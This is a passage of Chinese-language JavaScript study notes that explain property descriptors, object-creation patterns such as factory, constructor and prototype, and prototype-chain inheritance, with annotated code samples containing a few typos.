class=\"hljs-comment\">//无法修改，非严格模式下赋值会被忽略；严格模式下，抛出错误；</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>访问器属性</li>\n</ul>\n<blockquote>\n<p>不包含数据值，包含一对儿~~</p>\n<p>getter()和setter();</p>\n<ol>\n<li>configurable:表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；</li>\n<li>Enumerable：表示是否可以通过for-in循环返回属性；默认为true;</li>\n<li>Get:读取属性时调用，默认undefined；</li>\n<li>Set:写入属性时调用，默认undefined；</li>\n</ol>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> book=&#123;<br>    <span class=\"hljs-attr\">_year</span>:<span class=\"hljs-number\">2004</span>,\t\t\t<span class=\"hljs-comment\">//前置下划线表示只可以通过对象方法访问；</span><br>    <span class=\"hljs-attr\">edition</span>:<span class=\"hljs-number\">1</span><br>&#125;;<br><br><span class=\"hljs-title class_\">Objcect</span>.<span class=\"hljs-title function_\">defineProperty</span>(book,<span class=\"hljs-string\">&quot;year&quot;</span>,&#123;<br>    <span class=\"hljs-attr\">get</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;\t\t\t\t\t\t<span class=\"hljs-comment\">//只写getter意味着不能写，写入会被忽略；严格模式报错；</span><br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>;<br>    &#125;,<br>    <span class=\"hljs-attr\">set</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">newValue</span>)&#123;<br>        <span class=\"hljs-keyword\">if</span>(newValue&gt;<span class=\"hljs-number\">2004</span>)&#123;<br>            <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>=newValue;<br>            <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">edition</span>+=newValue-<span class=\"hljs-number\">2004</span>;<br>        &#125;<br>    &#125;<br>&#125;);<br><br><span class=\"hljs-comment\">//定义多个属性</span><br><span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">defineProperties</span>(book,&#123;<br>    <span class=\"hljs-attr\">_year</span>:&#123;<br>        <span class=\"hljs-attr\">value</span>:<span class=\"hljs-number\">2004</span>,<br>    &#125;,<br>    <span class=\"hljs-attr\">edition</span>:&#123;<br>        <span class=\"hljs-attr\">value</span>:<span class=\"hljs-number\">1</span><br>    &#125;,<br>    <span class=\"hljs-attr\">year</span>:&#123;<br>       <span class=\"hljs-attr\">get</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;\t\t\t\t\t\t<span class=\"hljs-comment\">//只写getter意味着不能写，写入会被忽略；严格模式报错；</span><br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>;<br>        &#125;,<br>        <span class=\"hljs-attr\">set</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">newValue</span>)&#123;<br>            <span class=\"hljs-keyword\">if</span>(newValue&gt;<span class=\"hljs-number\">2004</span>)&#123;<br>                <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>=newValue;<br>                <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">edition</span>+=newValue-<span class=\"hljs-number\">2004</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//读取属性的特性</span><br><span class=\"hljs-keyword\">var</span> year=<span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">getOwnPropertyDescriptor</span>(book,<span class=\"hljs-string\">&quot;_year&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(year.<span class=\"hljs-property\">value</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-创建对象\"><a href=\"#2-创建对象\" class=\"headerlink\" title=\"2.创建对象\"></a>2.创建对象</h3><blockquote>\n<p>工厂模式抽象了具体创建对象的过程，考虑到ES中无法创建类，开发人员就发明了一i中函数</p>\n</blockquote>\n<h5 id=\"工厂模式\"><a href=\"#工厂模式\" class=\"headerlink\" title=\"工厂模式\"></a>工厂模式</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-params\">name,age,job</span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> o=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Objcet</span>();<br>    o.<span class=\"hljs-property\">name</span>=name;<br>    o.<span class=\"hljs-property\">age</span>=age;<br>    o.<span class=\"hljs-property\">job</span>=job;<br>    o.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;;<br>    <span class=\"hljs-keyword\">return</span> o;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>工厂模式虽然解决了创建多个相似对象的问题，但是没有解决对象识别的问题，无法知道一个对象的类型；</p>\n</blockquote>\n<h5 id=\"构造函数模式\"><a href=\"#构造函数模式\" class=\"headerlink\" title=\"构造函数模式\"></a>构造函数模式</h5><blockquote>\n<p>ES中的构造函数能船舰特定类型的对象；</p>\n<p>像Object和Array这样的原生构造函数，运行时会自动出现再执行环境；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name,age,job</span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>=name;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>=age;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span>=job;<br>    <br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>除了相同部分，有如下区别：</p>\n<ul>\n<li>没有显式的创建对象；</li>\n<li>直接将属性和方法赋给了this对象；</li>\n<li>没有return；</li>\n</ul>\n<p>Note：构造函数使用应该使用首字母大写的开头，非构造函数小写字母开头；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//要创建Person实例，需要使用new</span><br><span class=\"hljs-keyword\">let</span> newPerson=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;Martin&quot;</span>,<span class=\"hljs-number\">18</span>,<span class=\"hljs-string\">&quot;Programmer&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(newPerson.<span class=\"hljs-property\">constructor</span>==<span class=\"hljs-title class_\">Person</span>);   <span class=\"hljs-comment\">//true</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(newPerson <span class=\"hljs-keyword\">instanceof</span> <span class=\"hljs-title class_\">Person</span>);\t<span class=\"hljs-comment\">//true</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；</p>\n<p>构造函数虽然好用，但是也不是没有缺点。</p>\n<p>主要问题是：每个方法都要再实例上重新创建一遍；</p>\n<p>不同实例创建相同函数名的函数，会导致不同的作用域链和标识符解析。</p>\n<p>创建相同的Function实例完全没有必要，况且有this对象在根本不用在执行代码前九八函数绑定到特定的对象上面；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//优化方法</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name,age</span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>=name;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>=age;<br>    <br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sayName</span>=sayName;<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">sayName</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>构造函数内部将sayName属性设置成全局的sayName函数。</p>\n<p>新的问题：虽然方法定义在全局作用域，但实际上只能被某个对象调用，让全局作用域名不副实；</p>\n<p>更进一步，如果一个对象需要定义很多方法，则需要定义多个全局函数，失去封装性；</p>\n</blockquote>\n<h5 id=\"原型模式\"><a href=\"#原型模式\" class=\"headerlink\" title=\"原型模式\"></a>原型模式</h5><blockquote>\n<p>我们创建的每个函数都有一个prototype属性，这个属性是一个指针，指向一个对象。</p>\n<p>Prototype就是通过调用构造函数而创建的那个对象实例的原型对象；</p>\n<p>使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法，即不用再构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <br>&#125;<br><br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span>;<br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">age</span>=<span class=\"hljs-number\">23</span>;<br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>&#125;;<br><br><span class=\"hljs-keyword\">var</span> person1=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>();<br><span class=\"hljs-keyword\">var</span> person2=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>();<br>person1.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span><br>person2.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Jack&quot;</span><br>person1.<span class=\"hljs-title function_\">sayName</span>();   <span class=\"hljs-comment\">//&quot;Martin&quot;</span><br>person2.<span class=\"hljs-title function_\">sayName</span>();\t<span class=\"hljs-comment\">//&quot;Jack&quot;</span><br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person1.<span class=\"hljs-title function_\">sayName</span>()==person2.<span class=\"hljs-title function_\">sayName</span>())\t<span class=\"hljs-comment\">//true</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"理解原型对象\"><a href=\"#理解原型对象\" class=\"headerlink\" title=\"理解原型对象\"></a>理解原型对象</h5><blockquote>\n<p>无论什么时候，只要创建了新韩淑，会为这个函数创建一个prototype属性，这个属性指向函数的原型对象。</p>\n<p>默认情况下，所有原型对象都会自动获得一个constructor属性，这个属性包含一个指向prototype属性所在函数的指针。</p>\n<p>举前面的例子：</p>\n<p>Person.prototype.constructor指向Person，通过这个构造函数可以伪原型对象添加其他属性；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/08/953a324fdcd4fa42.png\"></p>\n<blockquote>\n<p>当为对象实例添加一个属性时，属性会屏蔽原型对象中保存的同名属性；</p>\n<p>原型对象中的属性值不变；只会修改实例中的属性；</p>\n<p>使用delete操作符可以完全删除实例属性，达到访问原型属性值的目的；</p>\n<p>使用hasOwnProperty()来检查属性值是来自于原型还是实例；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/08/b6a6f03230b36450.png\"></p>\n<h5 id=\"原型与in操作符\"><a href=\"#原型与in操作符\" class=\"headerlink\" title=\"原型与in操作符\"></a>原型与in操作符</h5><blockquote>\n<p>有两种方式使用in操作符：单独使用和for-in循环使用；</p>\n<p>单独使用：通过对象能返回给定属性时返回true（不论原型和实例）；hasOwnProperty()只适用于实例；</p>\n<p>tips:如果in返回true而hasOwnProperty()返回false，可以确定属性是原型中的属性；</p>\n<p>for-in中使用：返回的是通过对象访问的，可以枚举的属性；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//获得对象上所有的可枚举实例</span><br>object.<span class=\"hljs-title function_\">keys</span>();<br><br><span class=\"hljs-keyword\">var</span> p=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>();<br><span class=\"hljs-keyword\">var</span> pKeys=<span class=\"hljs-title class_\">Obcject</span>.<span class=\"hljs-title function_\">keys</span>(p);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"更简单的原型语法\"><a href=\"#更简单的原型语法\" class=\"headerlink\" title=\"更简单的原型语法\"></a>更简单的原型语法</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//简写prototype</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\"></span>)&#123;&#125;<br><br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>=&#123;<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">29</span>,<br>    <span class=\"hljs-attr\">job</span>:<span class=\"hljs-string\">&quot;Software Engineer&quot;</span>,<br>    <span class=\"hljs-attr\">sayName</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;<br>&#125;;<br><br><span class=\"hljs-comment\">//上面的代码里，将Person.prototype设置为一个字面量创建的新对象；但是此时constructor不再指向Person了；</span><br><span class=\"hljs-comment\">//每创建一个函数，同时会创建他的prototype对象，这个对象自动获得constructor属性；</span><br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>=&#123;<br>    <span class=\"hljs-attr\">constructor</span>:<span class=\"hljs-title class_\">Person</span>,<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">29</span>,<br>    <span class=\"hljs-attr\">job</span>:<span class=\"hljs-string\">&quot;Software Engineer&quot;</span>,<br>    <span class=\"hljs-attr\">sayName</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"组合使用：构造函数模式和原型模式\"><a href=\"#组合使用：构造函数模式和原型模式\" class=\"headerlink\" title=\"组合使用：构造函数模式和原型模式\"></a>组合使用：构造函数模式和原型模式</h5><blockquote>\n<p>构造函数用于定义实例属性；原型模式用于定义方法和共享属性；</p>\n<p>共享方法，但是每个实例有自己的属性副本；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name, age, job</span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span> = name; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span> = age; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span> = job; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">friends</span> = [<span class=\"hljs-string\">&quot;Shelby&quot;</span>, <span class=\"hljs-string\">&quot;Court&quot;</span>]; <br>&#125; <br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span> = &#123; <br> constructor : <span class=\"hljs-title class_\">Person</span>, <br> sayName : <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>); <br> &#125; <br>&#125; <br></code></pre></td></tr></table></figure>\n\n<h5 id=\"动态原型模式\"><a href=\"#动态原型模式\" class=\"headerlink\" title=\"动态原型模式\"></a>动态原型模式</h5><blockquote>\n<p>通过将所有信息封装到构造函数，再构造函数中初始化原型；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name, age, job</span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span> = name; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span> = age; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span> = job; <br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">typeof</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sayName</span>!=<span class=\"hljs-string\">&quot;function&quot;</span>)&#123;<br>        <span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>\n\n<h5 id=\"寄生构造函数\"><a href=\"#寄生构造函数\" class=\"headerlink\" title=\"寄生构造函数\"></a>寄生构造函数</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name, age, job</span>)&#123; <br> <span class=\"hljs-keyword\">var</span> o = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>(); <br> o.<span class=\"hljs-property\">name</span> = name; <br> o.<span class=\"hljs-property\">age</span> = age; <br> o.<span class=\"hljs-property\">job</span> = job; <br> o.<span class=\"hljs-property\">sayName</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>); <br> &#125;; <br> <span class=\"hljs-keyword\">return</span> o; <br>&#125; <br><span class=\"hljs-keyword\">var</span> friend = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;Nicholas&quot;</span>, <span class=\"hljs-number\">29</span>, <span class=\"hljs-string\">&quot;Software Engineer&quot;</span>); <br>friend.<span class=\"hljs-title function_\">sayName</span>(); <span class=\"hljs-comment\">//&quot;Nicholas&quot; </span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-继承\"><a href=\"#3-继承\" class=\"headerlink\" title=\"3.继承\"></a>3.继承</h3><ul>\n<li>接口继承：只继承方法签名；</li>\n<li>实现继承：继承实际方法；</li>\n</ul>\n<p>ES只支持实现继承，主要依靠原型链实现；</p>\n<h4 id=\"（1）原型链\"><a href=\"#（1）原型链\" class=\"headerlink\" title=\"（1）原型链\"></a>（1）原型链</h4><blockquote>\n<p>利用原型让一个引用类型继承另一个引用类型的属性和方法；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//原型链基本模式</span><br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span>=<span class=\"hljs-literal\">true</span>;<br>&#125;<br><br><span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSuperValue</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span>;<br>&#125;;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span>=<span class=\"hljs-literal\">false</span>;<br>&#125;<br><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SuperType</span>();\t\t<span class=\"hljs-comment\">//子类的原型是父类的实例；子类获得父类的所有属性和方法；</span><br><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSubValue</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span>;<br>&#125;;<br><br><span class=\"hljs-keyword\">var</span> instacne=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(instacne.<span class=\"hljs-title function_\">getSuperValue</span>());\t\t<span class=\"hljs-comment\">//true;</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/11/606aeed6b87048a8.png\"></p>\n<ul>\n<li>别忘记默认的原型</li>\n</ul>\n<blockquote>\n<p>所有引用类型都默认继承Object；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/11/ccdc684bf208d6d1.png\"></p>\n<ul>\n<li>确定原型和实例的关系</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">instance <span class=\"hljs-keyword\">instanceof</span> <span class=\"hljs-title class_\">Object</span>;<br><span class=\"hljs-title class_\">Objcet</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-title function_\">isPrototypeOf</span>(instance);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>谨慎的定义代码</li>\n</ul>\n<blockquote>\n<p>子类优势需要重写超类中的某个方法，或者添加超累不存在的某个方法；</p>\n<p>不管怎样，给原型添加的代码一定要放在替换原型语句之后；</p>\n</blockquote>\n<figure class=\"highlight 